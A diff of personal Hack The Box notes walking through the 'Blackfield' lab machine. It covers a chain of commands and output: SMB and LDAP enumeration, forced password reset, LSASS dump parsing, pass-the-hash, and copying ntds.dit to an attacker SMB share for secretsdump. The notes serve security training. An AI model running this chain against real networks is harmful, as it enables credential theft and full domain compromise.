@@ -622,8 +622,8 @@ $
 
 
 
-- Logged into smb share with credentials with success
-	- Available shares NETLOGON & SYSVOL
+- Logged into smb share with supports credentials with success
+	- Available shares `IPC$, NETLOGON, profles$ & SYSVOL`
 ```bash
 nxc smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares
 SMB         10.10.10.192    445    DC01              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -640,6 +640,277 @@ SMB         10.10.10.192    445    DC01             profiles$       READ
 SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
 
 ``` 
+
+- profiles$ share reveals shares for all the users on the machine
+	- support and audit2020 on list
+	- both directories empty
+```bash
+$ smbclient //10.10.10.192/profiles$ -U "support"%"#00^BlackKnight"
+╰─ smbclient -U "$USER%$PASS" //$TARGET/profiles$                                      
+Try "help" to get a list of possible commands.                                         
+smb: \> dir                                                                            
+  .                                   D        0  Wed Jun  3 12:47:12 2020             
+  ..                                  D        0  Wed Jun  3 12:47:12 2020             
+  AAlleni                             D        0  Wed Jun  3 12:47:11 2020             
+  ABarteski                           D        0  Wed Jun  3 12:47:11 2020             
+  ABekesz                             D        0  Wed Jun  3 12:47:11 2020             
+  ABenzies                            D        0  Wed Jun  3 12:47:11 2020             
+  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020             
+  AChampken                           D        0  Wed Jun  3 12:47:11 2020             
+  ACheretei                           D        0  Wed Jun  3 12:47:11 2020             
+  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020             
+  AHigchens                           D        0  Wed Jun  3 12:47:11 2020             
+  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
+  AKlado                              D        0  Wed Jun  3 12:47:11 2020
+  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
+  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
+  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
+  AKubale                             D        0  Wed Jun  3 12:47:11 2020
+  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
+  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
+  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
+  ANavay                              D        0  Wed Jun  3 12:47:11 2020
+  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
+  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
+  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
+  APustulka                           D        0  Wed Jun  3 12:47:11 2020
+  ARotella                            D        0  Wed Jun  3 12:47:11 2020
+  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
+  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
+  ASischo                             D        0  Wed Jun  3 12:47:11 2020
+  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
+  ATakach                             D        0  Wed Jun  3 12:47:11 2020
+  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
+  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
+  audit2020                           D        0  Wed Jun  3 12:47:11 2020
+
+...
+  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020             
+  YVonebers                           D        0  Wed Jun  3 12:47:12 2020             
+  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020             
+  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020             
+  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020             
+  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
+  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
+  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
+  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
+  ZWausik                             D        0  Wed Jun  3 12:47:12 2020
+
+                5102079 blocks of size 4096. 1691976 blocks available
+smb: \> cd audit2020
+smb: \audit2020\> dir
+  .                                   D        0  Wed Jun  3 12:47:11 2020
+  ..                                  D        0  Wed Jun  3 12:47:11 2020
+
+                5102079 blocks of size 4096. 1675423 blocks available
+smb: \audit2020\> cd ../support
+smb: \support\> dir
+  .                                   D        0  Wed Jun  3 12:47:12 2020
+  ..                                  D        0  Wed Jun  3 12:47:12 2020
+
+                5102079 blocks of size 4096. 1675423 blocks available
+smb: \support\> 
+```
+
+- using ldapsearch to dump ldap info
+	- `ldapsearch -H ldap://blackfield.local -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump.txt`
+	- filtering results for lastLogon greater than 1, distinguishedName
+```bash
+╰─ ldapsearch -H ldap://blackfield.local -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' -LLL '(logonCount>=1)' 'distinguishedName' 'logonCount'
+dn: CN=Administrator,CN=Users,DC=BLACKFIELD,DC=local
+distinguishedName: CN=Administrator,CN=Users,DC=BLACKFIELD,DC=local
+logonCount: 6116
+
+dn: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
+logonCount: 134
+
+dn: CN=support,CN=Users,DC=BLACKFIELD,DC=local
+distinguishedName: CN=support,CN=Users,DC=BLACKFIELD,DC=local
+logonCount: 8
+
+dn: CN=svc_backup,CN=Users,DC=BLACKFIELD,DC=local
+distinguishedName: CN=svc_backup,CN=Users,DC=BLACKFIELD,DC=local
+logonCount: 4
+
+# refldap://ForestDnsZones.BLACKFIELD.local/DC=ForestDnsZones,DC=BLACKFIELD,DC=
+ local
+
+# refldap://DomainDnsZones.BLACKFIELD.local/DC=DomainDnsZones,DC=BLACKFIELD,DC=
+ local
+
+# refldap://BLACKFIELD.local/CN=Configuration,DC=BLACKFIELD,DC=local
+
+```
+
+- Running bloodhound with support credentials to extract AD information and connections
+	- `-c ALL` - All collection methods
+	- `-u support -p #00^BlackKnight` - Username and password to auth as
+	- `-d blackfield.local` - domain name
+	- `-dc dc01.blackfield.local` - DC name (it won’t let you use an IP here)
+	- `-ns 10.10.10.192` - use 10.10.10.192 as the DNS server
+```bash
+$ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
+INFO: Found AD domain: blackfield.local
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 18 computers
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Found 315 users
+INFO: Connecting to GC LDAP server: dc01.blackfield.local
+INFO: Found 51 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.BLACKFIELD.local
+INFO: Done in 00M 04S
+```
+
+- Within Bloodhound upload all of the files that bloodhound-python generated with support credentials
+	- Administration --> File ingest --> Upload Files
+		- search for support --> check outbound control 
+			- permission ForceChangePassword
+![[Pasted image 20251211180026.png]]
+
+- Tried to reset password with impacket-changepasswd
+	- something blocking this path
+```bash
+╭─ ~/htb/blackfield ▓▒░───────────────────────────────────────░▒▓ 255 ✘  09:40:42 AM  
+╰─ impacket-changepasswd blackfield.local/support@10.10.10.192 -altuser blackfield.loca
+l/audit2020 -newpass 'password187' -reset                                              
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies             
+                                                                                       
+[-] Please, provide either alternative password (-altpass) or NT hash (-althash) for au
+thentication, or specify -no-pass if you rely on Kerberos only                         
+╭─ ~/htb/blackfield ▓▒░─────────────────────────────────────────░▒▓ 1 ✘  10:23:06 AM  
+╰─ impacket-changepasswd blackfield.local/support:'#00^BlackKnight'@10.10.10.192 -altus
+er blackfield.local/audit2020 -newpass 'password187' -reset                            
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies             
+                                                                                       
+[-] Please, provide either alternative password (-altpass) or NT hash (-althash) for au
+thentication, or specify -no-pass if you rely on Kerberos only                         
+╭─ ~/htb/blackfield ▓▒░─────────────────────────────────────────░▒▓ 1 ✘  10:24:21 AM  
+╰─ impacket-changepasswd blackfield.local/support@10.10.10.192 -altuser blackfield.loca
+l/audit2020 -newpass 'password187' -reset                                              
+╭─ ~/htb/blackfield ▓▒░───────────────────────────────────────░▒▓ INT ✘  10:24:35 AM  
+╰─ impacket-changepasswd blackfield.local/support:'#00^BlackKnight'@blackfield -altuser
+ blackfield.local/audit2020 -newpass 'password187' -reset                              
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies             
+                                                                                       
+[-] Please, provide either alternative password (-altpass) or NT hash (-althash) for au
+thentication, or specify -no-pass if you rely on Kerberos only  
+```
+
+- Password reset over rpc
+	- forgot I was working on a windows machine and my first 2 password changes didn't take because they were not complex enough
+	- changed audit2020 p/w to password1!!!
+```bash
+╰─ rpcclient -U support //10.10.10.192 
+Password for [WORKGROUP\support]:
+rpcclient $> setuserinfo2
+Usage: setuserinfo2 username level password [password_expired]
+result was NT_STATUS_INVALID_PARAMETER
+rpcclient $> setuserinfo2 audit2020 23 'password'
+result: NT_STATUS_PASSWORD_RESTRICTION
+result was NT_STATUS_PASSWORD_RESTRICTION
+rpcclient $> setuserinfo2 audit2020 23 'password'
+result: NT_STATUS_PASSWORD_RESTRICTION
+result was NT_STATUS_PASSWORD_RESTRICTION
+rpcclient $> setuserinfo2 audit2020 23 'password!!!'
+result: NT_STATUS_PASSWORD_RESTRICTION
+result was NT_STATUS_PASSWORD_RESTRICTION
+rpcclient $> setuserinfo2 audit2020 23 'password!!!'
+result: NT_STATUS_PASSWORD_RESTRICTION
+result was NT_STATUS_PASSWORD_RESTRICTION
+rpcclient $> setuserinfo2 audit2020 23 'password1!'
+rpcclient $> 
+
+```
+
+- signing into smb with audit2020 new creds - audit2020 / password1!
+	- 3 directories - command_output, memory_analysis, tools
+		- in comman_doutput 3 files - domain_admins, domain_groups, domain_users
+```bash
+a╰─ smbclient //10.10.10.192/forensic -U 'BLACKFIELD\\audit2020%password1!'  
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Feb 23 08:03:16 2020
+  ..                                  D        0  Sun Feb 23 08:03:16 2020
+  commands_output                     D        0  Sun Feb 23 13:14:37 2020
+  memory_analysis                     D        0  Thu May 28 16:28:33 2020
+  tools                               D        0  Sun Feb 23 08:39:08 2020
+
+                5102079 blocks of size 4096. 1683072 blocks available
+smb: \> cd commands_output\
+smb: \commands_output\> mget *
+Get file domain_admins.txt? y
+getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
+Get file domain_groups.txt? y
+getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (6.4 KiloBytes/sec) (average 5.0 KiloBytes/sec)
+Get file domain_users.txt? y
+getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (109.3 KiloBytes/sec) (average 40.1 KiloBytes/sec)
+
+```
+
+- In domain_admin users are - Administrator, Ipwn3dYouCompany
+- In domain_users users are - Administrator, audit2020, Guest, Ipwn3dYouCompany, krbtgt, lydericlefebvre, support
+- in memory_analysis there is zips of memory dumps
+	- of note there is a lsass.zip that unzips into lsass.DMP
+	- we can use pypykatz to read the lsass.DMP file
+	- `pypykatz lsa minidump lsass.DMP | tee pypykatz_lsassDump.txt`
+		- pypykatz — offline Python implementation of Mimikatz
+		- lsa — target Local Security Authority credential material
+		- minidump — parse a memory dump file (not live LSASS)
+		- lsass.DMP — LSASS process memory dump input
+		- | (pipe) — send command output to the next command
+		- tee — display output and write it to a file simultaneously
+		- pypykatz_lsassDump.txt — file created/overwritten with results
+	- in the dump we find usernames and various hashes
+		- svc_backup NT 9658d1d1dcd9250115e2205d9f48400d
+		- Administrator NT 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+		- DC01 NT 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+
+- Use Evil-winrm to pass the hash of svc-backup
+	- `$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`
+	- pull user flag from Desktop
+	- 
+
+- Use Bloodhound again to find the the connection between svc-backup and backup operators
+![[Pasted image 20251215100243.png]]
+- hacker recipes article linking backup operators to dump lsass again
+	- https://www.thehacker.recipes/ad/movement/builtins/security-groups
+
+- Final chain (foothold -> root)
+	- `smbclient //10.10.10.192/forensic -U "BLACKFIELD\\audit2020%password1!!!" -c 'ls' | tee blackfield/logs/forensic_ls_root.txt`
+	- download `lsass.DMP` from `forensic\memory_analysis\`
+	- `python3 -m pypykatz lsa minidump blackfield/loot/lsass.DMP | tee blackfield/loot/pypykatz_lsassDump.txt`
+		- pulled `svc_backup` NT hash and initial Admin NT hash
+	- `evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`
+		- user flag on `C:\Users\svc_backup\Desktop\user.txt`
+	- `smbserver.py loot . -smb2support -username theo -password theo`
+	- `net use \\10.10.14.3\loot /user:theo theo`
+	- `diskshadow` (create shadow copy) + `robocopy /B Z:\Windows\NTDS \\10.10.14.3\loot ntds.dit`
+	- `impacket-secretsdump -ntds blackfield/loot/hives/ntds.dit -system blackfield/loot/hives/SYSTEM.save LOCAL | tee blackfield/logs/secretsdump_ntds.txt`
+		- Administrator NT hash: `184fb5e5178480be64824d4cd53b99ee`
+	- `evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee`
+		- root flag on `C:\Users\Administrator\Desktop\root.txt`
+
+- Evidence paths
+	- `blackfield/logs/forensic_ls_root.txt`
+	- `blackfield/loot/lsass.DMP`
+	- `blackfield/loot/pypykatz_lsassDump.txt`
+	- `blackfield/loot/hives/SYSTEM.save`
+	- `blackfield/loot/hives/ntds.dit`
+	- `blackfield/logs/secretsdump_ntds.txt`
+
+
+
+
+
+
+
+
+
 
 
 
